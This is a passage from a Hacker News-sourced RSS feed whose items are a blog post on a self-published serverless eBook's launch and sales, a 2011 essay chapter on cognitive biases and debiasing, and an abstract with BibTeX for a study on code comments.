-->(4%)<!-- --> discover <!-- -->morphe.com<!-- --> through Facebook, Reddit, and YouTube. <!-- -->102.7k<!-- --> <!-- -->(3%)<!-- --> visitors come from <!-- -->morphe.com<!-- -->'s email newsletters. Finally, <!-- -->29.4k<!-- --> <!-- -->(0.9%)<!-- --> people come from affiliates ‚Ä¶</h3></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reviewbolt.com/top/shopify/">https://reviewbolt.com/top/shopify/</a></em></p>]]>
            </description>
            <link>https://reviewbolt.com/top/shopify/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140934</guid>
            <pubDate>Mon, 15 Feb 2021 09:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first eBook launch ‚Äì results and feedback (10k USD in 27 days)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26140625">thread link</a>) | @alexellisuk
<br/>
February 15, 2021 | https://blog.alexellis.io/my-first-ebook-results-feedback/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/my-first-ebook-results-feedback/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<h2 id="whywriteanebookanyway">Why write an eBook anyway?</h2>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company - for a lunch &amp; learn, brownbag, or to better understand Serverless</li>
</ul>
<p>As long as the options add some value, it seems that people are willing to pay a little more and enjoy the choice.</p>
<p>There was no pre-launch and I didn't collect email addresses. I just tweeted about the eBook on Friday afternoon, and then nothing happened for three hours.</p>
<p>I interpreted this as a failure because I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>.</p>
<blockquote>
<p>You tend to get what you focus on, like when you think of installing a satellite dish, then realise that everyone on your street has one, and can't stop seeing them.</p>
</blockquote>
<p>In the same way, I saw failure to find market fit. In those first hours I convinced myself that the lack of sales was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>The sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and <a href="https://github.com/sponsors/alexellis">GitHub Sponsors</a> came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="The initial spike at launch"></p>
<p>Then things died down, and over the course of the week I wondered again if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page from search engines.</p>
<p>Still, it was more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD).</p>
<blockquote>
<p>The discount resulted in another large spike in sales.</p>
</blockquote>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>Gumroad has no way to offer a discount for a single tier, or to enable upgrades. So how did I fulfil the upgrade?</p>
<p>I did it by writing a function and deploying it to my Raspberry Pi. Gumroad can be configured to send a webhook (also called "a ping") to a HTTPS endpoint whenever there is a sale. My code just had to validate the sender, parse the dollar amount and email address, and then send out an email to the customer. I evaluated a few email services and settled on AWS SES for its simplicity and predictable pricing. I used <a href="https://inlets.dev/blog/2021/02/11/secure-letsencrypt-tunnel.html">inlets PRO</a> to receive webhooks.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>You can see the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a sharp drop-off in sales, again. I started to wonder why I was seeing this pattern?</p>
<p>At that time 99% of referrals had come from Twitter and from email. Had I exhausted my network? Had everyone who was going to buy an eBook on learning open-source serverless, already become a customer?</p>
<p>I went ahead and added a link on <a href="https://www.openfaas.com/">openfaas.com</a> and <a href="https://blog.alexellis.io/">on my blog</a> at the end of each post, to try and get more eyes on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but seemed to have no obvious effect on sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk. As they say, "nothing ventured, nothing gained".</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back. Part of <a href="https://blog.alexellis.io/still-in-the-game-my-2020-year-in-review/">my 2021 goals</a> is to find a way to make OpenFaaS sustainable.</p>
<blockquote>
<p>"If You Always Do What You've Always Done, You'll Always Get What You've Always Got." - Henry Ford</p>
</blockquote>
<p>The eBook has already brought in more revenue in a month, than the OpenFaaS GitHub Sponsors account has in a year.</p>
<p><a href="https://amzn.to/38N5uZy">The Right It</a> has taught me not to invest too much effort up front in any one idea, because it is likely to fail. That's just the way things go. Instead I'll be testing ideas out through small experiments that take a few hours or days, and using data to decide whether to invest more.</p>
<p>I'm happy to answer questions <a href="https://twitter.com/alexellisuk/">via Twitter</a>.</p>
<h2 id="update12feb2021">Update (12 Feb 2021)</h2>
<p>It took 27 days, but the eBook has now reached the milestone of 10k USD in sales! Most of the purchases being made now are from links on the OpenFaaS website, the faasd repo or my own blog. This is also known as long-tail, a slow and (mostly) steady stream of revenue.</p>
<p><img src="https://blog.alexellis.io/content/images/2021/02/update-rev6.png" alt="Launch event, offers and longtail"></p>
<blockquote>
<p>Visualised: Launch event, offers and longtail</p>
</blockquote>
<p>I've also released revision 6 of the eBook which has a much more detailed section on CI/CD and recipes for multi-arch builds. I'm using it to deploy endpoints directly to my Raspberry Pi from GitHub Actions.</p>
<p>If you're curious about how Serverless functions can be of use for your next side-project or idea, why not try the eBook and / or video workshop? You can get your money back within 7 days if you're not satisfied.</p>
<p>Events and webhooks can be used to build custom extensions for SaaS products or existing systems. You can see an example in my <a href="https://github.com/alexellis/gumroad-responder">gumroad-responder</a> which forwards messages to Slack, and sends emails via AWS SES to customers during a promotion.</p>
<blockquote>
<p>üéÅ To say thanks for reading, the next 20 people can get 20% off any tier - including the video workshop package using the discount link below:</p>
</blockquote>
<p>Check the options on Gumroad: <a href="https://gumroad.com/l/serverless-for-everyone-else/avid-reader">Serverless For Everyone Else on Gumroad</a></p>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/my-first-ebook-results-feedback/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140625</guid>
            <pubDate>Mon, 15 Feb 2021 08:55:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facing the Intelligence Explosion (2011)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26140581">thread link</a>) | @Tomte
<br/>
February 15, 2021 | https://intelligenceexplosion.com/2011/the-crazy-robots-rebellion/ | <a href="https://web.archive.org/web/*/https://intelligenceexplosion.com/2011/the-crazy-robots-rebellion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
	<!--#header-->
<div id="content">

<div id="post-102">


<p>Meet Linda:</p>
<blockquote><p>Linda is thirty-one years old, single, outspoken, and very bright. She majored in philosophy. As a student, she was deeply concerned with issues of discrimination and social justice, and also participated in antinuclear demonstrations.</p></blockquote>
<p>Now, rank these possible descriptions of Linda by how likely they are:</p>
<ul>
<li>Linda is a teacher in elementary school.</li>
<li>Linda works in a bookstore and takes yoga classes.</li>
<li>Linda is active in the feminist movement.</li>
<li>Linda is a psychiatric social worker.</li>
<li>Linda is a member of the League of Women Voters.</li>
<li>Linda is a bank teller.</li>
<li>Linda is an insurance salesperson.</li>
<li>Linda is a bank teller and is active in the feminist movement.</li>
</ul>
<p>When Amos Tversky and Daniel Kahneman gave this test to students, the students ranked the last possibility, ‚Äúfeminist bank teller,‚Äù as <em>more likely</em> than the ‚Äúbank teller‚Äù option.<a id="fn1x8-bk" href="#fn1x8"><sup>1</sup></a></p>
<p>But that can‚Äôt possibly be correct. The probability of Linda being a bank teller can‚Äôt be <em>less</em> than the probability of her being a bank teller <em>and</em> a feminist.</p>
<p>This is my ‚ÄúHumans are crazy‚Äù Exhibit A: The <a href="http://facingthesing.wpengine.com/2011/the-laws-of-thought/">laws</a> of probability theory dictate that as a story gets more complicated, and depends on the truth of more and more claims, its probability of being true decreases. But for humans, a story often seems <em>more</em> likely as it is embellished with details that paint a compelling story: ‚ÄúLinda can‚Äôt be <em>just</em> a bank teller; look at her! She majored in philosophy and participated in antinuclear demonstrations. She‚Äôs probably a <em>feminist</em> bank teller.‚Äù</p>
<p>How else are humans crazy? After <a href="http://www.amazon.com/Thinking-Fast-Slow-Daniel-Kahneman/dp/0374275637/">decades of research</a> and <a href="http://www.amazon.com/Heuristics-Biases-Psychology-Intuitive-Judgment/dp/0521796792/">thousands of experiments</a>, let us count the ways . . .</p>
<ul>
<li>We <a href="https://www.rti.org/pubs/bk-0001-1009_web.pdf">wouldn‚Äôt pay</a> much more to save two hundred thousand birds than we would to save two thousand birds.<a id="fn2x8-bk" href="#fn2x8"><sup>2</sup></a> Our willingness to pay does not scale with the size of potential impact. Instead of making decisions with first-grade math, we imagine a <em>single</em> drowning bird and then give money based on the strength of our emotional response to that imagined scenario. (<a href="http://lesswrong.com/lw/hw/scope_insensitivity/">Scope insensitivity</a>, <a href="http://lesswrong.com/lw/lg/the_affect_heuristic/">affect heuristic</a>.)</li>
<li>Spin a wheel that lands on a number from ten to sixty-five, then guess what percentage of African nations are in the U.N. Your guess will be hugely affected by an irrelevant factor‚Äîwhat number the wheel landed on‚Äîmerely because your brain was primed with that number.<a id="fn3x8-bk" href="#fn3x8"><sup>3</sup></a> In short, ‚Äúany random thing that happens to you can hijack your judgment and personality for the next few minutes.‚Äù (<a href="http://lesswrong.com/lw/k3/priming_and_contamination/">Anchoring</a>, <a href="http://lesswrong.com/lw/3b/never_leave_your_room/">priming</a>.)</li>
<li>Hear about two recent plane crashes, and we are less likely to fly, even though it‚Äôs not the probability of a plane crash that has increased, merely its availability to our memory.<a id="fn4x8-bk" href="#fn4x8"><sup>4</sup></a> In general, we often judge how probable something is based on how easily instances of that thing come to mind. (<a href="http://psychology.wikia.com/wiki/Availability_heuristic">Availability heuristic</a>.)</li>
<li>We draw different conclusions from the same information depending on how that information is presented. (<a href="http://en.wikipedia.org/wiki/Framing_(social_sciences)">Framing effects</a>.)</li>
<li>We start with a conclusion and then look for evidence to support it, rather than starting with a hypothesis and looking for evidence that might confirm or disconfirm it. (<a href="http://lesswrong.com/lw/js/the_bottom_line/">The bottom line</a>, <a href="http://lesswrong.com/lw/iw/positive_bias_look_into_the_dark/">confirmation bias</a>, <a href="http://lesswrong.com/lw/ju/rationalization/">rationalization</a>.)</li>
<li>We are creatures of habit. We do mostly what we‚Äôve done before, rather than taking actions aimed at maximizing the probabilistic achievement of our goals. (<a href="http://en.wikipedia.org/wiki/Habit_(psychology)">Habits</a>, <a href="http://lesswrong.com/lw/4e/cached_selves/">cached selves</a>.)</li>
</ul>
<p>Perhaps the scariest bias is this one:</p>
<ul>
<li>The <em>sophistication effect</em>: The most knowledgeable people, because they possess greater ammunition with which shoot down facts and arguments incongruent with their own position, are actually <em>more prone</em> to several of these biases.<a id="fn5x8-bk" href="#fn5x8"><sup>5</sup></a></li>
</ul>
<p>Because of this, learning about biases can <a href="http://lesswrong.com/lw/he/knowing_about_biases_can_hurt_people/">hurt you</a> if you‚Äôre not careful. As <a href="http://www.michaelshermer.com/2002/09/smart-people-believe-weird-things/">Michael Shermer</a> says, ‚ÄúSmart people believe weird things because they are skilled at defending beliefs they arrived at for non-smart reasons.‚Äù<a id="fn6x8-bk" href="#fn6x8"><sup>6</sup></a></p>
<p>There are <a href="http://wiki.lesswrong.com/wiki/Bias">many other examples</a> of human insanity. They can be amusing at times, but things get sad when you think about how these biases lead us to <a href="http://lesswrong.com/lw/3gj/efficient_charity_do_unto_others/">give highly inefficient charity</a>. Things get <em>scary</em> when you think about how these biases affect our <a href="http://lesswrong.com/lw/gw/politics_is_the_mindkiller">political process</a> and our <a href="http://intelligence.org/files/CognitiveBiases.pdf">engagement</a> with <a href="http://lesswrong.com/lw/8f0/existential_risk/">existential risks</a>.</p>
<p>And if you study the <em>causes</em> of our beliefs and motivations long enough, another realization hits you.</p>
<p>‚ÄúOh my God,‚Äù you think. ‚ÄúIt‚Äôs not that I have a rational little <a href="http://commonsenseatheism.com/?p=8844">homunculus</a> inside that is being ‚Äòcorrupted‚Äô by all these evolved heuristics and biases layered over it. No, the data are saying that <a href="http://www.amazon.com/Why-Everyone-Else-Hypocrite-Evolution/dp/0691146748/">the software program that is me</a> just <em>is</em> heuristics and biases. I just <em>am</em> this <a href="http://www.amazon.com/Kluge-Haphazard-Construction-Human-Mind/dp/0618879641/">kluge</a> of evolved cognitive modules and algorithmic shortcuts. I‚Äôm not an <em>agent</em> designed to have correct beliefs and pursue explicit goals; I‚Äôm a crazy robot <a href="http://www.amazon.com/Selfish-Gene-Anniversary----Introduction/dp/0199291152/">built</a> as a vehicle for propagating genes without spending too much energy on expensive thinking neurons.‚Äù</p>
<p>The good news is that we are robots who have <em>realized</em> we are robots, and by way of rational self-determination we can stage a <a href="http://en.wikipedia.org/wiki/Metacognition">robot‚Äôs rebellion</a> against our default programming.<a id="fn7x8-bk" href="#fn7x8"><sup>7</sup></a></p>
<p>But we‚Äôre going to need some military-grade rationality training to do so.</p>
<p>Or, as the experts call it, ‚Äúdebiasing.‚Äù Researchers haven‚Äôt just been discovering and explaining the depths of human insanity; they‚Äôve also been testing methods that can help us improve our thinking, clarify our goals, and give us power over our own destinies.</p>
<p>Different biases are meliorated by different techniques, but one of the most useful debiasing interventions is this: <em>Consider the opposite</em>.</p>
<blockquote><p>By necessity, cognitive strategies tend to be context-specific rules tailored to address a narrow set of biases . . . This fact makes the simple but general strategy of ‚Äúconsider the opposite‚Äù all the more impressive, because it has been effective at reducing <a href="http://en.wikipedia.org/wiki/Overconfidence_effect">overconfidence</a>, <a href="http://lesswrong.com/lw/il/hindsight_bias/">hindsight biases</a>, and <a href="http://lesswrong.com/lw/k3/priming_and_contamination/">anchoring effects</a>. . . . The strategy consists of nothing more than asking oneself, ‚ÄúWhat are some reasons that my initial judgment might be wrong?‚Äù The strategy is effective because it directly counteracts the basic problem of association-based processes‚Äîan overly narrow sample of evidence‚Äîby expanding the sample and making it more representative. Similarly, prompting decision makers to consider alternative hypotheses has been shown to reduce confirmation biases in seeking and evaluating new information.<a id="fn8x8-bk" href="#fn8x8"><sup>8</sup></a></p></blockquote>
<p>Another useful skill is that of <a href="http://lesswrong.com/lw/7e5/the_cognitive_science_of_rationality/"><em>cognitive override</em></a>:</p>
<ol>
<li>Notice when you‚Äôre speaking or acting on an intuitive judgment.</li>
<li>If the judgment is important, override your intuitive judgment and apply the <a href="http://facingthesing.wpengine.com/2011/the-laws-of-thought/">laws of thought</a> instead. (This requires prior training in algebra, logic, probability theory, decision theory, etc.<a id="fn9x8-bk" href="#fn9x8"><sup>9</sup></a>)</li>
</ol>
<p>To see this one in action, consider the following problem:</p>
<blockquote><p>A bat and a ball cost $1.10 in total. The bat costs $1.00 more than the ball. How much does the ball cost?</p></blockquote>
<p><a href="http://www.nobelprize.org/nobel_prizes/economics/laureates/2002/kahnemann-lecture.pdf">Most people</a> give the first response that comes to mind: $0.10.<a id="fn10x8-bk" href="#fn10x8"><sup>10</sup></a> But elementary algebra shows this can‚Äôt be right: the bat would then have to cost $1.10, for a total of $1.20. To get this one right, you have to <em>notice</em> your intuitive answer coming out, and say ‚ÄúNo! Algebra.‚Äù And then do the algebra.</p>
<p>Those who <em>really</em> want to figure out what‚Äôs true about our world will spend thousands of hours studying the <a href="http://facingthesing.wpengine.com/2011/the-laws-of-thought/">laws of thought</a>, studying the specific ways in which humans are crazy, and practicing <a href="http://lesswrong.com/lw/5x8/teachable_rationality_skills/">teachable rationality skills</a> so they can avoid fooling themselves.</p>
<p>And <em>then</em>, finally, we may be able to stage a robot‚Äôs rebellion, figure out how the world works, clarify our goals, and start <a href="http://lesswrong.com/lw/7i/rationality_is_systematized_winning/">winning</a> more often. Maybe we‚Äôll even be able to navigate an intelligence explosion successfully.</p>
<p>* * *</p>
<p><small><a id="fn1x8" href="#fn1x8-bk"><sup>1</sup></a>Amos Tversky and Daniel Kahneman, ‚ÄúExtensional Versus Intuitive Reasoning: The Conjunction Fallacy in Probability Judgment,‚Äù <em>Psychological Review</em> 90, no. 4 (1983): 293‚Äì315, <span>doi</span>:<a href="http://dx.doi.org/10.1037/0033-295X.90.4.293">10.1037/0033-295X.90.4.293</a>.</small></p>
<p><small><a id="fn2x8" href="#fn2x8-bk"><sup>2</sup></a>William H. Desvousges et al., <em>Mesuring Nonuse Damages Using Contingent Valuation: An Experimental Evaluation of Accuracy</em>, technical report (Research Triangle Park, NC: RTI International, 2010), <span>doi</span>:<a href="http://dx.doi.org/10.3768/rtipress.2009.bk.0001.1009">10.3768/rtipress.2009.bk.0001.1009</a>.</small></p>
<p><small><a id="fn3x8" href="#fn3x8-bk"><sup>3</sup></a>Amos Tversky and Daniel Kahneman, ‚ÄúJudgment Under Uncertainty: Heuristics and Biases,‚Äù <em>Science</em> 185, no. 4157 (1974): 1124‚Äì1131, <span>doi</span>:<a href="http://dx.doi.org/10.1126/science.185.4157.1124">10.1126/science.185.4157.1124</a>.</small></p>
<p><small><a id="fn4x8" href="#fn4x8-bk"><sup>4</sup></a>Maia Szalavitz, ‚Äú10 Ways We Get the Odds Wrong,‚Äù <em>Psychology Today</em>, January 1, 2008, <a href="http://www.psychologytoday.com/articles/200712/10-ways-we-get-the-odds-wrong">http://www.psychologytoday.com/articles/200712/10-ways-we-get-the-odds-wrong</a>.</small></p>
<p><small><a id="fn5x8" href="#fn5x8-bk"><sup>5</sup></a>Charles S. Taber and Milton Lodge, ‚ÄúMotivated Skepticism in the Evaluation of Political Beliefs,‚Äù <em>American Journal of Political Science</em> 50 (3 2006): 755‚Äì769, <span>doi</span>:<a href="http://dx.doi.org/10.1111/j.1540-5907.2006.00214.x">10.1111/j.1540- 5907.2006.00214.x</a>.</small></p>
<p><small><a id="fn6x8" href="#fn6x8-bk"><sup>6</sup></a>Michael Shermer, ‚ÄúSmart People Believe Weird Things,‚Äù <em>Scientific American</em> 287, no. 3 (2002): 35, <span>doi</span>:<a href="http://dx.doi.org/10.1038/scientificamerican0902-35">10.1038/scientificamerican0902-35</a>.</small></p>
<p><small><a id="fn7x8" href="#fn7x8-bk"><sup>7</sup></a>Keith E. Stanovich, ‚ÄúHigher-Order Preferences and the Master Rationality Motive,‚Äù <em>Thinking and Reasoning</em> 14, no. 1 (2008): 111‚Äì117, <span>doi</span>:<a href="http://dx.doi.org/10.1080/13546780701384621">10.1080/13546780701384621</a>.</small></p>
<p><small><a id="fn8x8" href="#fn8x8-bk"><sup>8</sup></a>Richard P. Larrick, ‚ÄúDebiasing,‚Äù in <em>Blackwell Handbook of Judgment and Decision Making</em>, ed. Derek J. Koehler and Nigel Harvey, Blackwell Handbooks of Experimental Psychology (Malden, MA: Blackwell, 2004), 316‚Äì338.</small></p>
<p><small><a id="fn9x8" href="#fn9x8-bk"><sup>9</sup></a>Geoffrey T. Fong, David H. Krantz, and Richard E. Nisbett, ‚ÄúThe Effects of Statistical Training on Thinking About Everyday Problems,‚Äù <em>Cognitive Psychology</em> 18, no. 3 (1986): 253‚Äì292, <span>doi</span>:<a href="http://dx.doi.org/10.1016/0010-0285(86)90001-0">10.1016/0010-0285(86)90001-0</a>.</small></p>
<p><small><a id="fn10x8" href="#fn10x8-bk"><sup>10</sup></a>Daniel Kahneman, ‚ÄúA Perspective on Judgment and Choice: Mapping Bounded Rationality,‚Äù <em>American Psychologist</em> 58, no. 9 (2003): 697‚Äì720, <span>doi</span>:<a href="http://dx.doi.org/10.1037/0003-066X.58.9.697">10.1037/0003-066X.58.9.697</a>.</small></p>


<p><a href="https://intelligenceexplosion.com/2011/not-built-to-think-about-ai/" rel="next">Next Chapter  ‚Üí</a></p>
</div>


</div><!--//content-->














</div></div>]]>
            </description>
            <link>https://intelligenceexplosion.com/2011/the-crazy-robots-rebellion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140581</guid>
            <pubDate>Mon, 15 Feb 2021 08:50:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Commenting Source Code: Is It Worth It for Small Programming Tasks? (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26140364">thread link</a>) | @hacksilver
<br/>
February 15, 2021 | https://cse.cs.ovgu.de/cse/commenting-source-code-is-it-worth-it-for-small-programming-tasks-5/ | <a href="https://web.archive.org/web/*/https://cse.cs.ovgu.de/cse/commenting-source-code-is-it-worth-it-for-small-programming-tasks-5/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p> <span>Commenting Source Code: Is It Worth It For Small Programming Tasks?</span>. <span>In: <span>Springer Empirical Software Engineering (EMSE), </span><span>24 </span><span>(3), </span><span>S. 1418‚Äì1457, </span><span>2018</span>, <span>ISSN: 1382-3256</span>.</span></p>
<h2>Abstract</h2><p>Maintaining a program is a time-consuming and expensive task in software engineering. Consequently, several approaches have been proposed to improve the comprehensibility of source code. One of such approaches are comments in the code that enable developers to explain the program with their own words or predefined tags. Some empirical studies indicate benefits of comments in certain situations, while others find no benefits at all. Thus, the real effect of comments on software development remains uncertain. In this article, we describe an experiment in which 277 participants, mainly professional software developers, performed small programming tasks on differently commented code. Based on quantitative and qualitative feedback, we i) partly replicate previous studies, ii) investigate performances of differently experienced participants when confronted with varying types of comments, and iii) discuss the opinions of developers on comments. Our results indicate that comments seem to be considered more important in previous studies and by our participants than they are for small programming tasks. While other mechanisms, such as proper identifiers, are considered more helpful by our participants, they also emphasize the necessity of comments in certain situations.</p>
<h2>Links</h2><ul><li><i></i><a href="https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2018/10/paper-influence-comments_preliminary.pdf" title="https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2018/10/paper-influence-[...]" target="_blank">https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2018/10/paper-influence-[...]</a></li><li><i></i><a href="https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2021/02/nielebock-et-al-emse2019-comments-replication_package.zip" title="https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2021/02/nielebock-et-al-[...]" target="_blank">https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2021/02/nielebock-et-al-[...]</a></li><li><i></i><a href="https://dx.doi.org/10.1007/s10664-018-9664-z" title="Folge der DOI-Nummer:10.1007/s10664-018-9664-z" target="_blank">doi:10.1007/s10664-018-9664-z</a></li></ul>
<h2>BibTeX (<a href="https://cse.cs.ovgu.de/cse?feed=tp_pub_bibtex&amp;key=NielebockComments2018">Download</a>)</h2><pre>@article{NielebockComments2018,
title = {Commenting Source Code: Is It Worth It For Small Programming Tasks?},
author = {Sebastian Nielebock and Dariusz Krolikowski and Jacob Kr\"{u}ger and Thomas Leich and Frank Ortmeier},
editor = {Springer Science+Business Media, LLC, part of Springer Nature},
url = {https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2018/10/paper-influence-comments_preliminary.pdf
https://cse.cs.ovgu.de/cse-wordpress/wp-content/uploads/2021/02/nielebock-et-al-emse2019-comments-replication_package.zip},
doi = {10.1007/s10664-018-9664-z},
issn = {1382-3256},
year  = {2018},
date = {2018-11-16},
journal = {Springer Empirical Software Engineering (EMSE)},
volume = {24},
number = {3},
pages = {1418--1457},
publisher = {Springer US},
abstract = {Maintaining a program is a time-consuming and expensive task in software engineering. Consequently, several approaches have been proposed to improve the comprehensibility of source code. One of such approaches are comments in the code that enable developers to explain the program with their own words or predefined tags. Some empirical studies indicate benefits of comments in certain situations, while others find no benefits at all. Thus, the real effect of comments on software development remains uncertain. In this article, we describe an experiment in which 277 participants, mainly professional software developers, performed small programming tasks on differently commented code. Based on quantitative and qualitative feedback, we i) partly replicate previous studies, ii) investigate performances of differently experienced participants when confronted with varying types of comments, and iii) discuss the opinions of developers on comments. Our results indicate that comments seem to be considered more important in previous studies and by our participants than they are for small programming tasks. While other mechanisms, such as proper identifiers, are considered more helpful by our participants, they also emphasize the necessity of comments in certain situations.},
keywords = {Comments, Documentation and Maintenance, Empirical Study, Program Comprehension},
pubstate = {published},
tppubtype = {article}
}
</pre>
			</div></div>]]>
            </description>
            <link>https://cse.cs.ovgu.de/cse/commenting-source-code-is-it-worth-it-for-small-programming-tasks-5/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140364</guid>
            <pubDate>Mon, 15 Feb 2021 08:18:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Architecture: How You Make Them Care]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26140202">thread link</a>) | @qznc
<br/>
February 14, 2021 | http://beza1e1.tuxen.de/architecture_care.html | <a href="https://web.archive.org/web/*/http://beza1e1.tuxen.de/architecture_care.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
